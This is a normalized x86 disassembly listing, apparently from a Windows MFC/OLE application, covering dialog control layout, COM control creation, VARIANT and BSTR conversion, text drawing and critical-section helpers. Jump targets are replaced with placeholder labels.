cmp eax [ ebp - 0x8 ]
jne r-xdata
push [ esi ]
push ebx
call [ SetWindowContextHelpId@IAT ]
cmp esi 0xffffffff
je r-xdata
mov eax [ ebp - 0x1c ]
call [ GetWindow@IAT ]
mov esi [ ebx ]
inc [ ebp + 0xc ]
add ebx 0x4
mov [ ebp + 0x10 ] eax
test esi esi
je r-xdata
add edi [ ebp - 0x10 ]
xor ebx ebx
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp + 0x10 ] ebx
jmp r-xdata
sub_425cfe
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
pop edi
leave
retn 0x4
mov eax [ eax + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax [ edi + 0x34 ]
mov eax [ eax + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
push esi
mov ecx [ edi + 0x34 ]
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
add ecx 0x20
call sub_43d618
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x88 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ax [ eax + 0x90 ]
test ax ax
je r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call sub_42bfcb
mov ax [ esi + 0x4 ]
test ax ax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
movzx eax ax
push eax
mov ecx edi
call sub_441585
mov esi eax
mov ecx [ esi + 0x38 ]
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x38 ]
push 0x1
mov [ ecx + 0x90 ] eax
mov eax [ esi + 0x38 ]
push [ ebp + 0x8 ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8c ]
call sub_42bfe8
mov esi eax
jmp r-xdata
movzx eax ax
push eax
mov ecx edi
call sub_441585
push [ eax + 0x38 ]
mov ecx esi
call sub_42bfd4
mov ecx [ edi + 0x34 ]
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
add ecx 0x20
call sub_43d618
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x8c ]
pop esi
test esi esi
je r-xdata
sub_425e19
mov eax sub_4639c5
call sub_42dc88
sub esp 0x80
push ebx
push edi
mov edi [ ebp + 0x14 ]
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
lea eax [ edi + 0x12 ]
mov [ ebp - 0x18 ] eax
je r-xdata
movsx edx [ edi + 0xa ]
movsx eax [ edi + 0xe ]
movsx ecx [ edi + 0xc ]
add eax edx
push esi
movsx esi [ edi + 0x8 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
add ecx esi
mov [ ebp - 0x40 ] esi
push [ eax + 0x1c ]
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x38 ] ecx
call [ MapDialogRect@IAT ]
cmp [ ebp + 0x20 ] 0x4
mov esi [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ebx
jb r-xdata
mov edx [ edi + 0x8 ]
mov ax [ eax ]
mov [ ebp - 0x64 ] edx
mov edx [ edi + 0x4 ]
mov [ ebp - 0x60 ] edx
mov dx [ edi + 0xc ]
mov [ ebp - 0x5c ] dx
mov dx [ edi + 0xe ]
mov ecx edi
mov [ ebp - 0x5a ] dx
mov dx [ edi + 0x10 ]
mov [ ebp - 0x56 ] ax
mov ax [ edi + 0x14 ]
add ecx 0x18
mov [ ebp - 0x58 ] dx
mov [ ebp - 0x54 ] ax
lea edi [ ebp - 0x64 ]
mov [ ebp - 0x18 ] ecx
mov eax [ rw-data ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0x18 ] 0x37a
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
je r-xdata
mov ebx [ esi ]
sub [ ebp + 0x20 ] 0x4
add esi 0x4
test ebx ebx
jbe r-xdata
mov eax [ esi ]
add esi 0xc
mov [ ebp - 0x2c ] eax
lea ecx [ eax - 0xc ]
cmp ecx ebx
mov [ ebp + 0x1c ] ecx
jbe r-xdata
cmp [ ebp + 0x18 ] 0x37b
jne r-xdata
xor ebx ebx
push ebx
push esi
call [ SysAllocStringLen@IAT ]
add ebx ebx
mov [ ebp + 0x10 ] eax
add esi ebx
sub [ ebp + 0x20 ] ebx
sub [ ebp + 0x20 ] eax
add [ ebp + 0x18 ] 0xfffc
mov eax [ esi ]
mov bx [ esi + 0x4 ]
sub [ ebp + 0x1c ] 0x6
add esi 0x4
inc esi
mov [ ebp - 0x28 ] eax
inc esi
cmp eax 0x80010001
jne r-xdata
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x50 ]
push ecx
push eax
cmp [ eax ] 0x7b
jne r-xdata
call [ CLSIDFromProgID@IAT ]
call [ CLSIDFromString@IAT ]
jmp r-xdata
push 0x1c
call sub_441e89
pop ecx
mov [ ebp - 0x30 ] eax
test eax eax
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ esi ]
add esi 0x4
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x10 ]
mov eax [ esi ]
add esi 0xc
push esi
mov [ ebp - 0x24 ] eax
call sub_4422d1
mov eax [ ebp - 0x10 ]
push 0xffffffef
pop ecx
mov [ ebp - 0x1c ] ebx
mov eax [ eax - 0x8 ]
sub ecx eax
add [ ebp + 0x1c ] ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
pop esi
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_426c8b
test eax eax
je r-xdata
push ebx
lea ecx [ ebp - 0x8c ]
push [ ebp + 0x20 ]
mov [ ebp + 0x1c ] eax
push esi
call sub_44dd21
mov si [ ebp + 0x18 ]
lea eax [ ebp - 0x8c ]
sub si 0x378
mov [ ebp - 0x4 ] 0x2
neg si
sbb esi esi
mov [ ebp + 0x14 ] ebx
and esi eax
cmp [ ebp + 0x1c ] ebx
jl r-xdata
xor eax eax
push ebx
mov ecx eax
push [ ebp - 0x28 ]
push [ ebp - 0x14 ]
call sub_42bfa5
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x10 ]
call [ SysFreeString@IAT ]
lea eax [ ebp + 0x14 ]
push eax
xor eax eax
cmp [ ebp + 0x18 ] 0x377
push [ ebp + 0x10 ]
sete al
push eax
push esi
movzx eax [ edi + 0x10 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x50 ]
push [ edi ]
push ebx
push eax
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x34 ]
call sub_426e99
test eax eax
je r-xdata
mov eax [ ebp - 0x2c ]
xor ebx ebx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8c ]
call sub_44dd5d
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax ebx
pop edi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x1c
mov ebx [ eax + 0x20 ]
mov ecx [ ebp + 0x14 ]
push 0x1
call sub_4288c8
mov eax [ ebp + 0x14 ]
push 0x13
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0xc ]
push [ eax + 0x20 ]
call [ SetWindowPos@IAT ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x8c ] ecx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
lea ecx [ eax + 0x9c ]
call sub_442281
mov eax [ ebp + 0x14 ]
mov cx [ ebp - 0x1c ]
mov [ eax + 0x90 ] cx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x94 ] ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x98 ] ecx
sub_4262e8
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ExtTextOutA@IAT ]
pop ebp
retn 0x1c
sub_42630d
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ecx + 0x4 ]
call [ TabbedTextOutA@IAT ]
mov ecx [ ebp + 0x8 ]
movsx edx ax
shr eax 0x10
movsx eax ax
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebp
retn 0x20
sub_426361
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x4 ]
call [ GrayStringA@IAT ]
pop ebp
retn 0x20
mov eax [ eax + 0x4 ]
sub_426463
mov eax sub_463f52
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_4435e0
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x20 ]
call sub_43d470
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x4 ]
call sub_43d470
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4264f0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0xc ] 0x0
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x10 ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn 0x8
sub_42652c
push esi
mov esi ecx
push edi
lea edi [ esi + 0x10 ]
push edi
call [ EnterCriticalSection@IAT ]
mov ecx [ esi + 0x8 ]
call sub_43d183
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
push edi
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
retn
sub_426554
mov eax sub_463fd4
call sub_42dc88
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov edi [ esi + 0xc ]
push ebx
mov eax [ edi ]
mov [ esi + 0xc ] eax
call [ LeaveCriticalSection@IAT ]
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push [ esi ]
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x8 ]
push [ esi + 0x4 ]
push eax
call sub_43d163
mov ecx [ esi + 0x4 ]
dec ecx
mov edx ecx
imul edx [ esi ]
test ecx ecx
lea eax [ edx + eax + 0x4 ]
jl r-xdata
inc ecx
mov edx [ esi + 0xc ]
mov [ eax ] edx
mov [ esi + 0xc ] eax
sub eax [ esi ]
dec ecx
jne r-xdata
sub_4265e3
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x4
push ebx
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0xc ]
push ebx
mov [ edi ] eax
mov [ esi + 0xc ] edi
call [ LeaveCriticalSection@IAT ]
pop ebx
sub_42665b
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
and [ edi + 0x8 ] 0x0
mov [ edi ] 0x8
test esi esi
je r-xdata
lea esp [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0xe
push esi
jne r-xdata
call [ lstrlenA@IAT ]
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov ebx esp
push esi
push ebx
push 0xffffffff
push [ ebp + 0x8 ]
xor eax eax
mov [ ebx ] ax
push eax
push eax
call [ MultiByteToWideChar@IAT ]
push ebx
call [ SysAllocString@IAT ]
call [ lstrlenA@IAT ]
push eax
push esi
call [ SysAllocStringByteLen@IAT ]
jmp r-xdata
call sub_43b7b5
test eax eax
mov [ edi + 0x8 ] eax
jne r-xdata
sub_4266d6
cmp [ esp + 0x8 ] 0xb
mov eax ecx
jne r-xdata
mov cx [ esp + 0x4 ]
mov [ eax ] 0x2
mov [ eax + 0x8 ] cx
cmp [ esp + 0x4 ] 0x0
mov [ eax ] 0xb
jne r-xdata
or [ eax + 0x8 ] 0xffff
jmp r-xdata
and [ eax + 0x8 ] 0x0
jmp r-xdata
retn 0x8
sub_42670c
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xa
mov eax ecx
jne r-xdata
cmp [ ebp + 0xc ] 0xb
jne r-xdata
mov [ eax ] 0xa
jmp r-xdata
mov [ eax ] 0x3
cmp [ ebp + 0x8 ] 0x0
mov [ eax ] 0xb
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8 ] ecx
or [ eax + 0x8 ] 0xffff
jmp r-xdata
and [ eax + 0x8 ] 0x0
jmp r-xdata
pop ebp
retn 0x8
sub_42674e
mov edx [ esp + 0x8 ]
test edx edx
jne r-xdata
mov eax [ esp + 0x4 ]
cmp edx ecx
jne r-xdata
mov edx ecx
push eax
push 0x0
push edx
push ecx
call [ VariantChangeType@IAT ]
push eax
call sub_42661c
cmp ax [ ecx ]
je r-xdata
retn 0x8
sub_4267a6
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x270f
push ebx
push esi
push edi
ja r-xdata
xor eax eax
mov di [ ebp + 0xc ]
push 0x1
pop esi
cmp di si
jb r-xdata
cmp di 0xc
ja r-xdata
test [ ebp + 0x8 ] 0x3
jne r-xdata
and [ ebp - 0x4 ] 0x0
movzx ecx [ ebp + 0x8 ]
mov eax ecx
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
movzx ecx di
mov edi [ ecx * 4 + rw-data ]
movzx edx [ ebp + 0x10 ]
lea ecx [ ecx * 4 + rw-data ]
sub eax edi
mov [ ebp + 0x10 ] edx
add eax [ ecx ]
cmp edx eax
jg r-xdata
cmp [ ebp + 0x10 ] 0x1d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
test edx edx
jne r-xdata
cmp [ ebp + 0x14 ] 0x17
ja r-xdata
xor eax eax
cmp [ ebp + 0x10 ] si
jb r-xdata
cmp di 0x2
jne r-xdata
cmp [ ebp + 0x18 ] 0x3b
ja r-xdata
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x3b
ja r-xdata
movzx esi [ ebp + 0x8 ]
mov eax esi
mov ebx 0x190
cdq
idiv ebx
mov ecx esi
push 0x64
shr ecx 0x2
add ecx eax
mov eax esi
imul eax eax 0x16d
add ecx eax
mov eax esi
cdq
pop esi
idiv esi
sub ecx eax
add ecx [ ebp + 0x10 ]
add ecx edi
cmp [ ebp + 0xc ] 0x2
ja r-xdata
movzx eax [ ebp + 0x14 ]
movzx edx [ ebp + 0x18 ]
imul eax eax 0x3c
add eax edx
sub ecx 0xa96c7
movzx edx [ ebp + 0x1c ]
imul eax eax 0x3c
add eax edx
mov [ ebp + 0x10 ] ecx
mov [ ebp + 0x8 ] eax
fild [ ebp + 0x8 ]
test ecx ecx
fmul [ r--data ]
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
fild [ ebp + 0x10 ]
mov eax [ ebp + 0x20 ]
push 0x1
fadd st1
fstp [ eax ]
pop eax
fstp st0
jmp r-xdata
fchs
dec ecx
pop edi
pop esi
pop ebx
leave
retn 0x1c
sub_4268e3
push esi
mov esi ecx
mov eax [ esi + 0x24 ]
inc eax
inc eax
cmp eax [ esi + 0x28 ]
jbe r-xdata
mov eax [ esi + 0x24 ]
mov cx [ esp + 0x8 ]
mov [ eax ] cx
add [ esi + 0x24 ] 0x2
mov eax esi
pop esi
retn 0x4
call sub_447e14
sub_42690a
push esi
mov esi ecx
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x28 ]
lea edx [ eax + 0x2 ]
cmp edx ecx
jbe r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ esp + 0x8 ]
mov ax [ eax ]
mov [ ecx ] ax
add [ esi + 0x24 ] 0x2
mov eax esi
pop esi
retn 0x4
sub eax ecx
mov ecx esi
inc eax
inc eax
push eax
call sub_447e90
sub_42693d
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4267a6
neg eax
sbb eax eax
inc eax
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x18
sub_4269a7
push ebp
mov ebp esp
push ecx
push esi
push edi
push [ ebp + 0x10 ]
mov esi [ GetMenuStringA@IAT ]
mov edi ecx
push 0x0
push 0x0
push [ ebp + 0x8 ]
push [ edi + 0x4 ]
call esi
test eax eax
mov [ ebp - 0x4 ] eax
jle r-xdata
mov ecx [ ebp + 0xc ]
call sub_4420d3
mov ecx [ ebp + 0xc ]
push ebx
lea ebx [ eax + eax + 0x2 ]
push ebx
call sub_4425ef
push [ ebp + 0x10 ]
push ebx
push eax
push [ ebp + 0x8 ]
push [ edi + 0x4 ]
call esi
mov ecx [ ebp + 0xc ]
push 0xffffffff
call sub_4425c7
pop ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
leave
retn 0xc
sub_426a04
mov eax sub_4644b0
call sub_42dc88
sub esp 0x34
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
or [ ebp - 0x1c ] 0xffffffff
mov [ ebp - 0x10 ] esp
push edi
push [ ebp + 0x8 ]
mov ebx ecx
push ebx
call sub_426c16
mov esi eax
xor edx edx
cmp esi edx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
xor ecx ecx
cmp [ esi + 0x24 ] 0xffffffff
mov [ ebp + 0x10 ] edx
mov [ ebp - 0x4 ] edx
setne cl
sub eax edx
mov [ ebp - 0x18 ] ecx
je r-xdata
mov [ eax ] ebx
mov edi [ edi ]
cmp edi edx
jl r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
lea eax [ ebp - 0x40 ]
push eax
call sub_426793
and [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec eax
je r-xdata
xor ecx ecx
cmp [ eax + 0x4 ] edx
setne cl
mov eax ecx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov eax [ edi + 0x8 ]
push 0x10
lea eax [ ebp - 0x30 ]
push [ edi + 0x8 ]
push eax
call sub_42e2d0
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
shl eax 0x4
push eax
call sub_441e89
mov ecx [ ebp - 0x28 ]
add esp 0x10
add ecx 0xfffffff
mov [ ebp - 0x30 ] eax
shl ecx 0x4
push ecx
mov ecx [ edi + 0x8 ]
push [ ecx ]
push eax
call sub_42e2d0
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x30 ]
add esp 0xc
shl eax 0x4
lea eax [ eax + ecx - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x3
mov [ eax + 0x8 ] ecx
lea eax [ ebp - 0x30 ]
jmp r-xdata
mov esi [ esi + 0x10 ]
lea eax [ ebp - 0x14 ]
cmp ecx edx
mov [ ebp - 0x14 ] 0x1
push eax
je r-xdata
dec eax
je r-xdata
mov ecx [ esi + 0x10 ]
cmp edi 0x2
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
push [ ebp - 0x30 ]
call sub_441eb2
pop ecx
jmp r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
push eax
lea eax [ ebp - 0x40 ]
mov ecx ebx
push eax
push 0x1
push esi
call sub_45741b
cmp [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] eax
movsx eax [ ebp - 0x38 ]
mov [ ebp + 0x10 ] eax
je r-xdata
mov ecx ebx
call esi
push [ ebp + 0x8 ]
mov ecx ebx
call esi
jmp r-xdata
mov esi [ esi + 0x14 ]
cmp ecx edx
je r-xdata
dec eax
jne r-xdata
mov ecx [ esi + 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ edi + 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov [ ebp + 0x10 ] eax
xor eax eax
cmp [ ebp - 0x14 ] eax
mov ecx ebx
call esi
push [ ebp + 0x8 ]
mov ecx ebx
call esi
jmp r-xdata
mov esi [ esi + 0x10 ]
lea eax [ ebp - 0x14 ]
push eax
cmp ecx edx
push [ edi + 0x20 ]
mov [ ebp - 0x14 ] 0x1
push [ edi + 0x1c ]
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c ]
cmp ecx 0xffffffff
je r-xdata
and [ ebp - 0x14 ] 0x0
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx ebx
call esi
push [ ebp + 0x8 ]
mov ecx ebx
call esi
jmp r-xdata
mov [ eax ] ecx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov [ ebp + 0x10 ] eax
xor eax eax
cmp [ ebp - 0x14 ] eax
jmp r-xdata
sub_426c16
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push edi
mov eax [ ecx ]
call [ eax + 0x3c ]
mov ecx [ ebp + 0x10 ]
mov edx eax
xor eax eax
cmp [ ecx ] eax
setne al
test edx edx
mov [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov edi [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x18 ] 0xffffffff
je r-xdata
add eax 0x28
cmp [ eax + 0x18 ] 0xffffffff
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ eax + 0x18 ] ecx
jne r-xdata
cmp [ eax + 0x4 ] edi
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp ecx 0xffffffff
jne r-xdata
cmp [ eax + 0x20 ] ebx
ja r-xdata
mov ecx [ eax + 0x20 ]
cmp ecx 0xffffffff
je r-xdata
cmp ebx ecx
jbe r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
cmp ecx ebx
je r-xdata
jmp r-xdata
sub_426c8b
mov eax sub_4644bc
call sub_42dc88
sub esp 0xc
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] edi
cmp [ edi + 0x34 ] 0x0
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ edi + 0x34 ] 0x0
je r-xdata
call sub_45357b
mov ecx [ eax + 0x1038 ]
push edi
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ edi + 0x34 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
xor eax eax
cmp [ edi + 0x34 ] eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
setne al
pop ebx
leave
retn
test edi edi
mov esi edi
je r-xdata
mov ebx 0x100
push [ esi + 0x1c ]
or [ esi + 0x24 ] ebx
call [ GetParent@IAT ]
push eax
call sub_43e7b3
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov eax [ esi + 0x1c ]
test esi esi
jne r-xdata
test [ esi + 0x24 ] ebx
jne r-xdata
sub_426d40
mov eax sub_4644d0
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_44195c
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push 0xa
lea ecx [ esi + 0x20 ]
mov [ esi + 0x1c ] eax
call sub_43d402
or [ esi + 0x3c ] 0xffffffff
or [ esi + 0x40 ] 0xffffffff
and [ esi + 0x44 ] 0x0
and [ esi + 0x48 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ esi + 0x4c ] r--data
mov [ esi + 0x50 ] r--data
mov [ esi ] r--data
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_426dbb
mov eax sub_4644ef
call sub_42dc88
sub esp 0x10
push esi
mov esi ecx
push edi
mov [ ebp - 0x1c ] esi
mov [ esi ] r--data
mov eax [ esi + 0x2c ]
mov [ ebp - 0x4 ] 0x1
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ esi + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
lea edi [ esi + 0x20 ]
lea edi [ esi + 0x20 ]
mov ecx edi
call sub_43d445
lea eax [ esi + 0x44 ]
push eax
call sub_4566e5
and [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_43d470
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_441976
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
lea edi [ esi + 0x20 ]
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x18 ]
mov ecx edi
call sub_43d5d6
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x14 ]
mov ecx edi
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43d618
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x88 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x14 ]
mov ecx edi
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43d618
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
sub_426e99
push ebp
mov ebp esp
sub esp 0x20
push esi
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov esi ecx
push eax
call [ CopyRect@IAT ]
push [ ebp + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
push [ ebp + 0x28 ]
sub eax ecx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
push [ ebp + 0x20 ]
sub ecx edx
mov [ ebp - 0x4 ] ecx
mov ecx esi
push [ ebp + 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426efa
pop esi
leave
retn 0x28
sub_426efa
mov eax sub_4644fc
call sub_42dc88
sub esp 0x10
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esp
call sub_45357b
mov ecx [ eax + 0x1038 ]
push [ ebp - 0x14 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov esi eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test esi esi
jne r-xdata
push [ ebp + 0x2c ]
mov ecx esi
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427ca6
xor ecx ecx
test eax eax
setge cl
mov edi ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
push [ esi + 0x20 ]
lea ecx [ eax + 0x20 ]
call sub_43d586
mov [ eax ] esi
mov eax [ ebp + 0x30 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x2c
mov eax edi
mov [ eax ] esi
jmp r-xdata
